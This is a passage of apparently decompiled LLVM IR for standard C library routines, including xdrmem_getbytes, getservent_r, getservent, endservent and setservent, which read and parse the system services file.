  %v1_10024b44 = add i32 %arg1, 20
  %v2_10024b44 = inttoptr i32 %v1_10024b44 to i32*
  %v3_10024b44 = load i32, i32* %v2_10024b44, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10024b4c = icmp ult i32 %v3_10024b44, %arg2
  br i1 %v2_10024b4c, label %dec_label_pc_10024b74, label %dec_label_pc_10024b58

dec_label_pc_10024b58:                            ; preds = %entry
  %v2_10024b50 = sub i32 %v3_10024b44, %arg2
  store i32 %v2_10024b50, i32* %v2_10024b44, align 4
  %v0_10024b5c = load i32, i32* %r31.global-to-local, align 4
  %v1_10024b5c = add i32 %v0_10024b5c, 12
  %v2_10024b5c = inttoptr i32 %v1_10024b5c to i32*
  %v3_10024b5c = load i32, i32* %v2_10024b5c, align 4
  store i32 %v3_10024b5c, i32* @r3, align 4
  store i32 268585828, i32* @lr, align 4
  %v0_10024b60 = call i32 @memcpy()
  store i32 %v0_10024b60, i32* %r3.global-to-local, align 4
  %v0_10024b64 = load i32, i32* %r31.global-to-local, align 4
  %v1_10024b64 = add i32 %v0_10024b64, 12
  %v2_10024b64 = inttoptr i32 %v1_10024b64 to i32*
  %v3_10024b64 = load i32, i32* %v2_10024b64, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10024b6c = load i32, i32* %r30.global-to-local, align 4
  %v2_10024b6c = add i32 %v1_10024b6c, %v3_10024b64
  store i32 %v2_10024b6c, i32* %v2_10024b64, align 4
  %v0_10024b84.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024b74

dec_label_pc_10024b74:                            ; preds = %entry, %dec_label_pc_10024b58
  %v0_10024b84 = phi i32 [ 0, %entry ], [ %v0_10024b84.pre, %dec_label_pc_10024b58 ]
  ret i32 %v0_10024b84

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024b74, { 1, 0 }
}

define i32 @xdrmem_getbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_10024ba4 = add i32 %arg1, 20
  %v2_10024ba4 = inttoptr i32 %v1_10024ba4 to i32*
  %v3_10024ba4 = load i32, i32* %v2_10024ba4, align 4
  store i32 %arg2, i32* @r3, align 4
  %v2_10024bac = icmp ult i32 %v3_10024ba4, %arg3
  br i1 %v2_10024bac, label %dec_label_pc_10024bd4, label %dec_label_pc_10024bb8

dec_label_pc_10024bb8:                            ; preds = %entry
  %v2_10024bb0 = sub i32 %v3_10024ba4, %arg3
  store i32 %v2_10024bb0, i32* %v2_10024ba4, align 4
  %v0_10024bbc = load i32, i32* %r31.global-to-local, align 4
  %v1_10024bbc = add i32 %v0_10024bbc, 12
  %v2_10024bbc = inttoptr i32 %v1_10024bbc to i32*
  %v3_10024bbc = load i32, i32* %v2_10024bbc, align 4
  store i32 %v3_10024bbc, i32* @r4, align 4
  store i32 268585924, i32* @lr, align 4
  %v0_10024bc0 = call i32 @memcpy()
  %v0_10024bc4 = load i32, i32* %r31.global-to-local, align 4
  %v1_10024bc4 = add i32 %v0_10024bc4, 12
  %v2_10024bc4 = inttoptr i32 %v1_10024bc4 to i32*
  %v3_10024bc4 = load i32, i32* %v2_10024bc4, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v1_10024bcc = load i32, i32* %r30.global-to-local, align 4
  %v2_10024bcc = add i32 %v1_10024bcc, %v3_10024bc4
  store i32 %v2_10024bcc, i32* %v2_10024bc4, align 4
  %v0_10024bd8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10024bd4

dec_label_pc_10024bd4:                            ; preds = %entry, %dec_label_pc_10024bb8
  %v0_10024bd8 = phi i32 [ 0, %entry ], [ %v0_10024bd8.pre, %dec_label_pc_10024bb8 ]
  ret i32 %v0_10024bd8

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10024bd4, { 1, 0 }
}

define i32 @__initbuf() local_unnamed_addr {
entry:
  %v3_10024c00 = load i32, i32* @global_var_1004525c.1343, align 4
  %v3_10024c04 = icmp eq i32 %v3_10024c00, 0
  br i1 %v3_10024c04, label %dec_label_pc_10024c0c, label %entry.dec_label_pc_10024c24_crit_edge

entry.dec_label_pc_10024c24_crit_edge:            ; preds = %entry
  %v0_10024c34.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10024c24

dec_label_pc_10024c0c:                            ; preds = %entry
  store i32 4237, i32* @r3, align 4
  store i32 268586004, i32* @lr, align 4
  %v0_10024c10 = call i32 @malloc()
  %v3_10024c14 = icmp eq i32 %v0_10024c10, 0
  store i32 %v0_10024c10, i32* @global_var_1004525c.1343, align 4
  br i1 %v3_10024c14, label %dec_label_pc_10024c20, label %dec_label_pc_10024c24

dec_label_pc_10024c20:                            ; preds = %dec_label_pc_10024c0c
  %v1_10024c20 = call i32 @abort(i32 0)
  br label %dec_label_pc_10024c24

dec_label_pc_10024c24:                            ; preds = %entry.dec_label_pc_10024c24_crit_edge, %dec_label_pc_10024c0c, %dec_label_pc_10024c20
  %v0_10024c34 = phi i32 [ %v0_10024c34.pre, %entry.dec_label_pc_10024c24_crit_edge ], [ %v0_10024c10, %dec_label_pc_10024c0c ], [ %v1_10024c20, %dec_label_pc_10024c20 ]
  ret i32 %v0_10024c34

; uselistorder directives
  uselistorder i32 (i32)* @abort, { 1, 0 }
  uselistorder label %dec_label_pc_10024c24, { 2, 1, 0 }
}

define i32 @getservent_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_10024c40 = icmp ugt i32 %arg3, 139
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %arg4, i32* @r26, align 4
  %v2_10024c58 = inttoptr i32 %arg4 to i32*
  store i32 0, i32* %v2_10024c58, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r28, align 4
  br i1 %v2_10024c40, label %dec_label_pc_10024c7c, label %dec_label_pc_10024c68

dec_label_pc_10024c68:                            ; preds = %entry
  %v0_10024c68 = call i32 @__errno_location()
  store i32 %v0_10024c68, i32* %r3.global-to-local, align 4
  store i32 34, i32* @r31, align 4
  %v2_10024c74 = inttoptr i32 %v0_10024c68 to i32*
  store i32 34, i32* %v2_10024c74, align 4
  br label %dec_label_pc_10024e60

dec_label_pc_10024c7c:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1004504c.1344 to i32), i32* @r29, align 4
  %v2_10024c90 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10024c90, i32* %r3.global-to-local, align 4
  %v4_10024c94 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 ptrtoint (i32* @global_var_1004504c.1344 to i32))
  %v0_10024c98 = load i32, i32* @r29, align 4
  store i32 %v0_10024c98, i32* %r3.global-to-local, align 4
  store i32 268586144, i32* @lr, align 4
  %v1_10024c9c = call i32 @pthread_mutex_lock(i32 %v0_10024c98)
  store i32 %v1_10024c9c, i32* %r3.global-to-local, align 4
  %v0_10024ca0 = load i32, i32* @r31, align 4
  %v1_10024ca0 = add i32 %v0_10024ca0, -140
  %v2_10024ca4 = icmp ugt i32 %v1_10024ca0, 4096
  %v0_10024ca8 = load i32, i32* @r28, align 4
  %v1_10024ca8 = add i32 %v0_10024ca8, 140
  store i32 %v1_10024ca8, i32* @r27, align 4
  br i1 %v2_10024ca4, label %dec_label_pc_10024cc0, label %dec_label_pc_10024cb0

dec_label_pc_10024cb0:                            ; preds = %dec_label_pc_10024c7c
  %v0_10024cb0 = call i32 @__errno_location()
  br label %dec_label_pc_10024cfc

dec_label_pc_10024cc0:                            ; preds = %dec_label_pc_10024c7c
  store i32 268697600, i32* %r31.global-to-local, align 4
  %v3_10024cc4 = load i32, i32* @global_var_10045260.1345, align 4
  %v3_10024cc8 = icmp eq i32 %v3_10024cc4, 0
  br i1 %v3_10024cc8, label %dec_label_pc_10024cd0, label %dec_label_pc_10024d04.preheader

dec_label_pc_10024cd0:                            ; preds = %dec_label_pc_10024cc0
  store i32 ptrtoint ([14 x i8]* @global_var_1002fb08.1346 to i32), i32* %r3.global-to-local, align 4
  store i32 268586212, i32* @lr, align 4
  %v3_10024ce0 = call i32 @__GI_fopen(i32 ptrtoint ([14 x i8]* @global_var_1002fb08.1346 to i32), i32 ptrtoint (i32* @global_var_1002fb18.1347 to i32))
  store i32 %v3_10024ce0, i32* %r3.global-to-local, align 4
  %v3_10024ce4 = icmp eq i32 %v3_10024ce0, 0
  store i32 %v3_10024ce0, i32* @global_var_10045260.1345, align 4
  br i1 %v3_10024ce4, label %dec_label_pc_10024cf0, label %dec_label_pc_10024cd0.dec_label_pc_10024d04.preheader_crit_edge

dec_label_pc_10024cd0.dec_label_pc_10024d04.preheader_crit_edge: ; preds = %dec_label_pc_10024cd0
  %v0_10024d0812.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10024d04.preheader

dec_label_pc_10024d04.preheader:                  ; preds = %dec_label_pc_10024cd0.dec_label_pc_10024d04.preheader_crit_edge, %dec_label_pc_10024cc0
  %v0_10024d0812 = phi i32 [ %v0_10024d0812.pre, %dec_label_pc_10024cd0.dec_label_pc_10024d04.preheader_crit_edge ], [ %v1_10024ca8, %dec_label_pc_10024cc0 ]
  %v3_10024d0c.ph = phi i32 [ %v3_10024ce0, %dec_label_pc_10024cd0.dec_label_pc_10024d04.preheader_crit_edge ], [ %v3_10024cc4, %dec_label_pc_10024cc0 ]
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v0_10024d0812, i32* %r3.global-to-local, align 4
  store i32 268586264, i32* @lr, align 4
  %v3_10024d1413 = call i32 @fgets(i32 %v0_10024d0812, i32 4096, i32 %v3_10024d0c.ph)
  store i32 %v3_10024d1413, i32* @r3, align 4
  store i32 %v3_10024d1413, i32* %r31.global-to-local, align 4
  %v4_10024d1814 = icmp eq i32 %v3_10024d1413, 0
  br i1 %v4_10024d1814, label %dec_label_pc_10024cf0, label %dec_label_pc_10024d20

dec_label_pc_10024cf0:                            ; preds = %dec_label_pc_10024d04.preheader, %dec_label_pc_10024d04.backedge, %dec_label_pc_10024cd0
  %v0_10024cf0 = call i32 @__errno_location()
  br label %dec_label_pc_10024cfc

dec_label_pc_10024cfc:                            ; preds = %dec_label_pc_10024cb0, %dec_label_pc_10024cf0
  %storemerge2 = phi i32 [ %v0_10024cb0, %dec_label_pc_10024cb0 ], [ %v0_10024cf0, %dec_label_pc_10024cf0 ]
  %storemerge1 = phi i32 [ 34, %dec_label_pc_10024cb0 ], [ 5, %dec_label_pc_10024cf0 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %storemerge1, i32* %r31.global-to-local, align 4
  %v2_10024cfc = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge1, i32* %v2_10024cfc, align 4
  br label %dec_label_pc_10024e54

dec_label_pc_10024d20:                            ; preds = %dec_label_pc_10024d04.preheader, %dec_label_pc_10024d04.backedge
  %v3_10024d1415 = phi i32 [ %v3_10024d14, %dec_label_pc_10024d04.backedge ], [ %v3_10024d1413, %dec_label_pc_10024d04.preheader ]
  %v1_10024d20 = inttoptr i32 %v3_10024d1415 to i8*
  %v2_10024d20 = load i8, i8* %v1_10024d20, align 1
  %v3_10024d24 = icmp eq i8 %v2_10024d20, 35
  br i1 %v3_10024d24, label %dec_label_pc_10024d04.backedge, label %dec_label_pc_10024d2c

dec_label_pc_10024d04.backedge:                   ; preds = %dec_label_pc_10024d20, %dec_label_pc_10024d2c, %dec_label_pc_10024d40, %dec_label_pc_10024d88
  %v3_10024d0c.pre = load i32, i32* @global_var_10045260.1345, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v0_10024d08 = load i32, i32* @r27, align 4
  store i32 %v0_10024d08, i32* %r3.global-to-local, align 4
  store i32 268586264, i32* @lr, align 4
  %v3_10024d14 = call i32 @fgets(i32 %v0_10024d08, i32 4096, i32 %v3_10024d0c.pre)
  store i32 %v3_10024d14, i32* @r3, align 4
  store i32 %v3_10024d14, i32* %r31.global-to-local, align 4
  %v4_10024d18 = icmp eq i32 %v3_10024d14, 0
  br i1 %v4_10024d18, label %dec_label_pc_10024cf0, label %dec_label_pc_10024d20

dec_label_pc_10024d2c:                            ; preds = %dec_label_pc_10024d20
  store i32 ptrtoint ([3 x i8]* @global_var_1002fb1c.1348 to i32), i32* @r4, align 4
  store i32 268586296, i32* @lr, align 4
  %v0_10024d34 = call i32 @__GI_strpbrk()
  store i32 %v0_10024d34, i32* %r3.global-to-local, align 4
  %v4_10024d38 = icmp eq i32 %v0_10024d34, 0
  br i1 %v4_10024d38, label %dec_label_pc_10024d04.backedge, label %dec_label_pc_10024d40

dec_label_pc_10024d40:                            ; preds = %dec_label_pc_10024d2c
  %v1_10024d34 = inttoptr i32 %v0_10024d34 to i8*
  store i32 0, i32* %r29.global-to-local, align 4
  store i8 0, i8* %v1_10024d34, align 1
  store i32 ptrtoint ([3 x i8]* @global_var_1002fb20.1349 to i32), i32* @r4, align 4
  %v0_10024d50 = load i32, i32* %r31.global-to-local, align 4
  %v1_10024d50 = load i32, i32* @r30, align 4
  %v2_10024d50 = inttoptr i32 %v1_10024d50 to i32*
  store i32 %v0_10024d50, i32* %v2_10024d50, align 4
  %v0_10024d54 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10024d54, i32* @r3, align 4
  store i32 268586332, i32* @lr, align 4
  %v0_10024d58 = call i32 @__GI_strpbrk()
  store i32 %v0_10024d58, i32* %r3.global-to-local, align 4
  %v4_10024d5c = icmp eq i32 %v0_10024d58, 0
  br i1 %v4_10024d5c, label %dec_label_pc_10024d04.backedge, label %dec_label_pc_10024d64

dec_label_pc_10024d64:                            ; preds = %dec_label_pc_10024d40
  %v1_10024d58 = inttoptr i32 %v0_10024d58 to i8*
  %v2_10024d64 = add i32 %v0_10024d58, 1
  store i32 %v2_10024d64, i32* %r31.global-to-local, align 4
  %v0_10024d68 = load i32, i32* %r29.global-to-local, align 4
  %v1_10024d68 = trunc i32 %v0_10024d68 to i8
  store i8 %v1_10024d68, i8* %v1_10024d58, align 1
  %v0_10024d74.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10024d74

dec_label_pc_10024d70:                            ; preds = %dec_label_pc_10024d74, %dec_label_pc_10024d74
  %v1_10024d70 = add i32 %v0_10024d70, 1
  store i32 %v1_10024d70, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10024d74

dec_label_pc_10024d74:                            ; preds = %dec_label_pc_10024d64, %dec_label_pc_10024d70
  %v0_10024d70 = phi i32 [ %v0_10024d74.pre, %dec_label_pc_10024d64 ], [ %v1_10024d70, %dec_label_pc_10024d70 ]
  %v1_10024d74 = inttoptr i32 %v0_10024d70 to i8*
  %v2_10024d74 = load i8, i8* %v1_10024d74, align 1
  switch i8 %v2_10024d74, label %dec_label_pc_10024d88 [
    i8 32, label %dec_label_pc_10024d70
    i8 9, label %dec_label_pc_10024d70
  ]

dec_label_pc_10024d88:                            ; preds = %dec_label_pc_10024d74
  store i32 %v0_10024d70, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1002fb24.1350 to i32), i32* @r4, align 4
  store i32 268586392, i32* @lr, align 4
  %v0_10024d94 = call i32 @__GI_strpbrk()
  store i32 %v0_10024d94, i32* %r3.global-to-local, align 4
  store i32 %v0_10024d94, i32* %r29.global-to-local, align 4
  %v4_10024d98 = icmp eq i32 %v0_10024d94, 0
  br i1 %v4_10024d98, label %dec_label_pc_10024d04.backedge, label %dec_label_pc_10024da0

dec_label_pc_10024da0:                            ; preds = %dec_label_pc_10024d88
  store i32 0, i32* @r27, align 4
  %v0_10024da4 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10024da4, i32* %r3.global-to-local, align 4
  %v3_10024da8 = inttoptr i32 %v0_10024d94 to i8*
  store i8 0, i8* %v3_10024da8, align 1
  %v0_10024dac = load i32, i32* %r29.global-to-local, align 4
  %v1_10024dac = add i32 %v0_10024dac, 1
  store i32 %v1_10024dac, i32* @r29, align 4
  %v0_10024db0 = load i32, i32* @r28, align 4
  store i32 %v0_10024db0, i32* %r31.global-to-local, align 4
  store i32 268586424, i32* @lr, align 4
  %v1_10024db4 = call i32 @atol(i32 %v0_10024da4)
  %v0_10024db8 = load i32, i32* @r29, align 4
  %v1_10024db8 = load i32, i32* @r30, align 4
  %v2_10024db8 = add i32 %v1_10024db8, 12
  %v3_10024db8 = inttoptr i32 %v2_10024db8 to i32*
  store i32 %v0_10024db8, i32* %v3_10024db8, align 4
  %v1_10024dbc = urem i32 %v1_10024db4, 65536
  store i32 %v1_10024dbc, i32* %r3.global-to-local, align 4
  %v0_10024dc0 = load i32, i32* @r28, align 4
  %v1_10024dc0 = load i32, i32* @r30, align 4
  %v2_10024dc0 = add i32 %v1_10024dc0, 4
  %v3_10024dc0 = inttoptr i32 %v2_10024dc0 to i32*
  store i32 %v0_10024dc0, i32* %v3_10024dc0, align 4
  %v0_10024dc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_10024dc4 = load i32, i32* @r30, align 4
  %v2_10024dc4 = add i32 %v1_10024dc4, 8
  %v3_10024dc4 = inttoptr i32 %v2_10024dc4 to i32*
  store i32 %v0_10024dc4, i32* %v3_10024dc4, align 4
  %v0_10024dcc = load i32, i32* @r29, align 4
  store i32 %v0_10024dcc, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1002fb20.1349 to i32), i32* @r4, align 4
  store i32 268586456, i32* @lr, align 4
  %v0_10024dd4 = call i32 @__GI_strpbrk()
  store i32 %v0_10024dd4, i32* %r3.global-to-local, align 4
  store i32 %v0_10024dd4, i32* %r9.global-to-local, align 4
  %v4_10024dd8 = icmp eq i32 %v0_10024dd4, 0
  br i1 %v4_10024dd8, label %dec_label_pc_10024e28thread-pre-split, label %dec_label_pc_10024de0

dec_label_pc_10024de0:                            ; preds = %dec_label_pc_10024da0
  %v0_10024de0 = load i32, i32* @r27, align 4
  %v1_10024de0 = trunc i32 %v0_10024de0 to i8
  %v3_10024de0 = inttoptr i32 %v0_10024dd4 to i8*
  store i8 %v1_10024de0, i8* %v3_10024de0, align 1
  br label %dec_label_pc_10024e24

dec_label_pc_10024de8:                            ; preds = %dec_label_pc_10024e30
  %v3_10024e3c = icmp eq i8 %v2_10024e30, 32
  br i1 %v3_10024e3c, label %dec_label_pc_10024e24, label %dec_label_pc_10024dec

dec_label_pc_10024dec:                            ; preds = %dec_label_pc_10024de8
  %v0_10024df0 = load i32, i32* @r28, align 4
  store i32 %v0_10024e08, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1002fb20.1349 to i32), i32* @r4, align 4
  %v0_10024dfc = load i32, i32* @r31, align 4
  br i1 %v3_10024e38, label %dec_label_pc_10024e24, label %dec_label_pc_10024e04

dec_label_pc_10024e04:                            ; preds = %dec_label_pc_10024dec
  %v1_10024df0 = add i32 %v0_10024df0, 136
  %v2_10024dfc = icmp ult i32 %v0_10024dfc, %v1_10024df0
  br i1 %v2_10024dfc, label %dec_label_pc_10024e08, label %dec_label_pc_10024e10

dec_label_pc_10024e08:                            ; preds = %dec_label_pc_10024e04
  %v2_10024e08 = inttoptr i32 %v0_10024dfc to i32*
  store i32 %v0_10024e08, i32* %v2_10024e08, align 4
  %v0_10024e0c = load i32, i32* @r31, align 4
  %v1_10024e0c = add i32 %v0_10024e0c, 4
  store i32 %v1_10024e0c, i32* @r31, align 4
  br label %dec_label_pc_10024e10

dec_label_pc_10024e10:                            ; preds = %dec_label_pc_10024e04, %dec_label_pc_10024e08
  store i32 268586516, i32* @lr, align 4
  %v0_10024e10 = call i32 @__GI_strpbrk()
  store i32 %v0_10024e10, i32* %r3.global-to-local, align 4
  store i32 %v0_10024e10, i32* %r9.global-to-local, align 4
  %v4_10024e14 = icmp eq i32 %v0_10024e10, 0
  br i1 %v4_10024e14, label %dec_label_pc_10024e28thread-pre-split, label %dec_label_pc_10024e1c

dec_label_pc_10024e1c:                            ; preds = %dec_label_pc_10024e10
  %v3_10024e20 = inttoptr i32 %v0_10024e10 to i8*
  store i8 0, i8* %v3_10024e20, align 1
  br label %dec_label_pc_10024e24

dec_label_pc_10024e24:                            ; preds = %dec_label_pc_10024dec, %dec_label_pc_10024de8, %dec_label_pc_10024de0, %dec_label_pc_10024e1c
  %v0_10024e24 = load i32, i32* %r9.global-to-local, align 4
  %v1_10024e24 = add i32 %v0_10024e24, 1
  store i32 %v1_10024e24, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10024e28

dec_label_pc_10024e28thread-pre-split:            ; preds = %dec_label_pc_10024da0, %dec_label_pc_10024e10
  br label %dec_label_pc_10024e28

dec_label_pc_10024e28:                            ; preds = %dec_label_pc_10024e28thread-pre-split, %dec_label_pc_10024e24
  %v0_10024e08 = phi i32 [ 0, %dec_label_pc_10024e28thread-pre-split ], [ %v1_10024e24, %dec_label_pc_10024e24 ]
  %v3_10024e28 = icmp eq i32 %v0_10024e08, 0
  br i1 %v3_10024e28, label %dec_label_pc_10024e44, label %dec_label_pc_10024e30

dec_label_pc_10024e30:                            ; preds = %dec_label_pc_10024e28
  %v1_10024e30 = inttoptr i32 %v0_10024e08 to i8*
  %v2_10024e30 = load i8, i8* %v1_10024e30, align 1
  %v3_10024e34 = icmp eq i8 %v2_10024e30, 0
  %v3_10024e38 = icmp eq i8 %v2_10024e30, 9
  br i1 %v3_10024e34, label %dec_label_pc_10024e44, label %dec_label_pc_10024de8

dec_label_pc_10024e44:                            ; preds = %dec_label_pc_10024e30, %dec_label_pc_10024e28
  %v1_10024e48 = load i32, i32* @r31, align 4
  %v2_10024e48 = inttoptr i32 %v1_10024e48 to i32*
  store i32 0, i32* %v2_10024e48, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v0_10024e50 = load i32, i32* @r30, align 4
  %v1_10024e50 = load i32, i32* @r26, align 4
  %v2_10024e50 = inttoptr i32 %v1_10024e50 to i32*
  store i32 %v0_10024e50, i32* %v2_10024e50, align 4
  br label %dec_label_pc_10024e54

dec_label_pc_10024e54:                            ; preds = %dec_label_pc_10024cfc, %dec_label_pc_10024e44
  store i32 %v2_10024c90, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268586592, i32* @lr, align 4
  %v0_10024e5c = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v0_10024e5c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024e60

dec_label_pc_10024e60:                            ; preds = %dec_label_pc_10024c68, %dec_label_pc_10024e54
  %v0_10024e64 = load i32, i32* @r31, align 4
  store i32 %v0_10024e64, i32* %r3.global-to-local, align 4
  ret i32 %v0_10024e64

; uselistorder directives
  uselistorder i8 %v2_10024e30, { 1, 2, 0 }
  uselistorder i32 %v0_10024e08, { 2, 3, 1, 0 }
  uselistorder i32 %v0_10024d70, { 0, 2, 1 }
  uselistorder i32 %v0_10024d58, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10024d34, { 1, 0, 2 }
  uselistorder i32 %v3_10024d14, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10024d0812, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 4, 2, 3, 5, 10, 11, 6, 7, 12, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 19, 13, 14, 15, 17, 16, 18, 1 }
  uselistorder i32 (i32)* @atol, { 64, 7, 6, 5, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 4, 3, 2, 1, 0, 14, 13, 12, 11, 10, 9, 8 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i8 32, { 1, 0, 3, 2, 4, 5, 8, 7, 9, 6, 12, 11, 10, 13, 14, 15, 16 }
  uselistorder i32 ()* @__GI_strpbrk, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 268586264, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10024e60, { 1, 0 }
  uselistorder label %dec_label_pc_10024e54, { 1, 0 }
  uselistorder label %dec_label_pc_10024e28thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10024e24, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10024e10, { 1, 0 }
  uselistorder label %dec_label_pc_10024d74, { 1, 0 }
  uselistorder label %dec_label_pc_10024d04.backedge, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10024d20, { 1, 0 }
  uselistorder label %dec_label_pc_10024cfc, { 1, 0 }
  uselistorder label %dec_label_pc_10024cf0, { 1, 0, 2 }
}

define i32 @getservent() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 268586632, i32* @lr, align 4
  %v0_10024e84 = call i32 @__initbuf()
  %v3_10024e90 = load i32, i32* @global_var_1004525c.1343, align 4
  %v2_10024e94 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268586660, i32* @lr, align 4
  %v5_10024ea0 = call i32 @getservent_r(i32* nonnull @global_var_1004db28.1351, i32 %v3_10024e90, i32 4237, i32 %v2_10024e94)
  %v3_10024ea8 = load i32, i32* %stack_var_-24, align 4
  ret i32 %v3_10024ea8
}

define i32 @__GI_endservent(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10024ed4 = ptrtoint i32* %stack_var_-40 to i32
  %v4_10024ee4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 ptrtoint (i32* @global_var_1004504c.1344 to i32))
  store i32 268697600, i32* @r29, align 4
  store i32 268586740, i32* @lr, align 4
  %v1_10024ef0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004504c.1344 to i32))
  %v3_10024ef4 = load i32, i32* @global_var_10045260.1345, align 4
  %v3_10024ef8 = icmp eq i32 %v3_10024ef4, 0
  br i1 %v3_10024ef8, label %dec_label_pc_10024f10, label %dec_label_pc_10024f04

dec_label_pc_10024f04:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10024f08.1352 to i32), i32* @lr, align 4
  %v1_10024f04 = inttoptr i32 %v3_10024ef4 to i16*
  %v2_10024f04 = call i32 @__GI_fclose(i16* %v1_10024f04)
  store i32 0, i32* @global_var_10045260.1345, align 4
  br label %dec_label_pc_10024f10

dec_label_pc_10024f10:                            ; preds = %entry, %dec_label_pc_10024f04
  store i32 %v2_10024ed4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 0, i32* @global_var_10045264.1353, align 4
  store i32 268586792, i32* @lr, align 4
  %v0_10024f24 = call i32 @__pthread_cleanup_pop_restore()
  ret i32 %v0_10024f24

; uselistorder directives
  uselistorder label %dec_label_pc_10024f10, { 1, 0 }
}

define i32 @setservent(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10024f60 = ptrtoint i32* %stack_var_-40 to i32
  %v4_10024f68 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 ptrtoint (i32* @global_var_1004504c.1344 to i32))
  store i32 268697600, i32* @r29, align 4
  store i32 268586872, i32* @lr, align 4
  %v1_10024f74 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004504c.1344 to i32))
  %v3_10024f78 = load i32, i32* @global_var_10045260.1345, align 4
  %v3_10024f8c = icmp eq i32 %v3_10024f78, 0
  br i1 %v3_10024f8c, label %dec_label_pc_10024f94, label %dec_label_pc_10024fa0

dec_label_pc_10024f94:                            ; preds = %entry
  store i32 268586904, i32* @lr, align 4
  %v3_10024f94 = call i32 @__GI_fopen(i32 ptrtoint ([14 x i8]* @global_var_1002fb08.1346 to i32), i32 ptrtoint (i32* @global_var_1002fb18.1347 to i32))
  store i32 %v3_10024f94, i32* @global_var_10045260.1345, align 4
  br label %dec_label_pc_10024fa8

dec_label_pc_10024fa0:                            ; preds = %entry
  store i32 268586920, i32* @lr, align 4
  %v2_10024fa4 = call i32 @__GI_rewind(i32 %v3_10024f78, i32 ptrtoint (i32* @global_var_1002fb18.1347 to i32))
  br label %dec_label_pc_10024fa8

dec_label_pc_10024fa8:                            ; preds = %dec_label_pc_10024f94, %dec_label_pc_10024fa0
  %v0_10024fa8 = load i32, i32* @r31, align 4
  %v3_10024fa8 = icmp eq i32 %v0_10024fa8, 0
  store i32 %v2_10024f60, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
